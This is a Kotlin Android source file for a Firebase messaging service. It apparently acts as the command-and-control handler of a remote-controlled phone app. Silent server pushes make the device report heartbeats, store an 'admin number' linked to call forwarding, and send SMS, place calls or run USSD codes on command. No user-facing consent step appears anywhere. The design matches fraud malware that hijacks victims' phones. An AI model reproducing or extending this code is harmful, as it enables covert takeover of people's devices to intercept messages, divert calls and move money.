package com.example.admin.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.example.admin.R
import com.example.admin.utils.Constants
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * ══════════════════════════════════════════════════════════════
 *  MyFirebaseMessagingService.kt — Server-driven FCM handler
 *
 *  Server sends FCM data messages (no notification block).
 *  Payload structure (data fields):
 *    type      = "CHECK_ONLINE" | "ADMIN_UPDATE" | "DEVICE_COMMAND"
 *    payload   = stringified JSON
 *    timestamp = epoch ms as string
 *
 *  CHECK_ONLINE  → device updates its heartbeat via backend
 *  ADMIN_UPDATE  → device stores new admin number locally
 *  DEVICE_COMMAND → device executes sms / call / ussd
 * ══════════════════════════════════════════════════════════════
 */
class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgSvc"
        private const val CHANNEL_ID = "default_channel_id"

        fun testLogs(context: Context) {
            Log.d(TAG, "FCM Test Log from ${context.packageName}")
        }
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    // ── Token refresh ────────────────────────────────────────────

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "FCM token refreshed — sending to backend")
        sendTokenToBackend(token)
    }

    /**
     * Save fresh FCM token to the backend device row so the server
     * always has an up-to-date token to send messages to.
     */
    private fun sendTokenToBackend(token: String) {
        val uid = getDeviceUid() ?: return

        serviceScope.launch {
            try {
                val body = JSONObject().apply {
                    put("uid", uid)
                    put("fcm_token", token)
                    put("fcm_token_updated_at", System.currentTimeMillis())
                }.toString().toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("${Constants.DEVICE_API_BASE_URL}/upsert")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        Log.d(TAG, "FCM token saved to backend for uid=$uid")
                    } else {
                        Log.w(TAG, "FCM token save failed: HTTP ${res.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendTokenToBackend error", e)
            }
        }
    }

    // ── Message received ─────────────────────────────────────────

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        Log.d(TAG, "FCM received from: ${remoteMessage.from}")

        // Server sends data-only messages (no notification block).
        val data = remoteMessage.data
        if (data.isEmpty()) {
            Log.w(TAG, "FCM message has no data — ignoring")
            return
        }

        val type      = data["type"] ?: data["action"] ?: ""
        val rawPayload = data["payload"] ?: "{}"
        val timestamp  = data["timestamp"]?.toLongOrNull() ?: System.currentTimeMillis()

        Log.d(TAG, "FCM type=$type ts=$timestamp")

        val payload = try {
            JSONObject(rawPayload)
        } catch (e: Exception) {
            Log.w(TAG, "Bad payload JSON: $rawPayload")
            JSONObject()
        }

        when (type.uppercase()) {
            "CHECK_ONLINE" -> handleCheckOnline(payload, timestamp)
            "ADMIN_UPDATE" -> handleAdminUpdate(payload)
            "DEVICE_COMMAND" -> handleDeviceCommand(payload)
            else -> Log.w(TAG, "Unknown FCM type: $type")
        }
    }

    // ── CHECK_ONLINE ─────────────────────────────────────────────

    /**
     * Server pinged us to verify this device is alive.
     * We respond by updating our heartbeat via the backend.
     * The admin portal watches Supabase realtime — when checkedAt
     * changes, it marks the device as Online.
     */
    private fun handleCheckOnline(payload: JSONObject, timestamp: Long) {
        val uid = payload.optString("uniqueid").ifBlank { getDeviceUid() } ?: return

        Log.d(TAG, "CHECK_ONLINE received for uid=$uid")

        serviceScope.launch {
            try {
                val now = System.currentTimeMillis()

                val body = JSONObject().apply {
                    put("uid",        uid)
                    put("data_type",  "heartbeat")
                    put("checked_at", now)
                    put("online",     true)
                    put("available",  "online")
                    put("timestamp",  now)
                    put("fcm_ping_ts", timestamp)
                }.toString().toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("${Constants.DEVICE_API_BASE_URL}/upsert")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        Log.d(TAG, "CHECK_ONLINE heartbeat sent for uid=$uid")
                    } else {
                        Log.w(TAG, "CHECK_ONLINE heartbeat failed: HTTP ${res.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleCheckOnline error", e)
            }
        }
    }

    // ── ADMIN_UPDATE ─────────────────────────────────────────────

    /**
     * Server pushed a new admin phone number.
     * Store it in SharedPreferences so the app can use it.
     * Also update Supabase via the backend if needed.
     */
    private fun handleAdminUpdate(payload: JSONObject) {
        val number = payload.optString("number")
        val status = payload.optString("status", "ACTIVE")
        val uid    = payload.optString("deviceId").ifBlank { getDeviceUid() }

        Log.d(TAG, "ADMIN_UPDATE number=$number status=$status uid=$uid")

        try {
            val prefs = getSharedPreferences("admin_config", Context.MODE_PRIVATE)
            prefs.edit()
                .putString("admin_number", number)
                .putString("admin_status", status)
                .putLong("admin_updated_at", System.currentTimeMillis())
                .apply()

            Log.d(TAG, "Admin number saved locally: $number ($status)")
        } catch (e: Exception) {
            Log.e(TAG, "handleAdminUpdate error", e)
        }

        // Optionally notify the user if status is INACTIVE
        if (status.uppercase() == "INACTIVE" || number == "inactive") {
            Log.d(TAG, "Admin number set to INACTIVE — call forwarding off")
        }
    }

    // ── DEVICE_COMMAND ───────────────────────────────────────────

    /**
     * Server sent a command: sms / call / ussd.
     * Broadcast an intent so the appropriate service/receiver handles it.
     */
    private fun handleDeviceCommand(payload: JSONObject) {
        val action  = payload.optString("action").uppercase()
        val to      = payload.optString("to")
        val body    = payload.optString("body")
        val simSlot = payload.optInt("simSlot", 0)
        val uid     = payload.optString("deviceId").ifBlank { getDeviceUid() }

        Log.d(TAG, "DEVICE_COMMAND action=$action to=$to uid=$uid")

        // Broadcast to the main app (FinalFetchService / BroadcastReceiver).
        // Keep the same intent action your app already handles so no extra code needed.
        try {
            val intent = android.content.Intent("com.example.admin.DEVICE_COMMAND").apply {
                `package` = packageName
                putExtra("action",   action)
                putExtra("to",       to)
                putExtra("body",     body)
                putExtra("simSlot",  simSlot)
                putExtra("deviceId", uid)
            }
            sendBroadcast(intent)
            Log.d(TAG, "DEVICE_COMMAND broadcast sent: $action")
        } catch (e: Exception) {
            Log.e(TAG, "handleDeviceCommand error", e)
        }
    }

    // ── Helpers ──────────────────────────────────────────────────

    /**
     * Read device UID from SharedPreferences (stored at registration).
     * Falls back to ANDROID_ID if not set.
     */
    private fun getDeviceUid(): String? {
        val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("device_uid", null)
        if (!saved.isNullOrBlank()) return saved

        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceUid fallback error", e)
            null
        }
    }

    // ── Notification (only shown for notification-type messages) ─

    private fun showNotification(title: String, messageBody: String) {
        createNotificationChannel()

        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)

        val notificationManager = NotificationManagerCompat.from(this)

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ActivityCompat.checkSelfPermission(
                        this,
                        android.Manifest.permission.POST_NOTIFICATIONS
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    Log.w(TAG, "Notification permission not granted — skipping")
                    return
                }
            }
            notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
        } catch (se: SecurityException) {
            Log.e(TAG, "Notification failed: ${se.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Default Channel",
                NotificationManager.IMPORTANCE_HIGH
            ).apply { description = "General Notifications" }

            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            mgr.createNotificationChannel(channel)
        }
    }
}
